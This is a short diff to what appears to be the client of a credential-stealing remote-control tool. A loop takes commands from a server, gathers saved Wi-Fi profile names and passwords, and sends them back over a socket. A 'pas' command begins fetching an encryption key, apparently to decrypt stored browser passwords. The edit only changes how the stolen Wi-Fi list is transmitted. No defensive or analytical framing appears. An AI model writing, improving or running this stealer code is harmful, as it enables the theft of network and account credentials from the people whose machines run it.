@@ -67,8 +67,7 @@ while True:
                         wifi_profile['password'] = password[1]
                     wifi_list.append(wifi_profile)
         client.send(str(len(wifi_list)).encode())
-        for x in range(len(wifi_list)):
-            client.send(str(wifi_list[x]).encode())
+        client.send(str(wifi_list).encode())
     if from_server == "pas":
         counter = 0
         key = fetching_encryption_key()
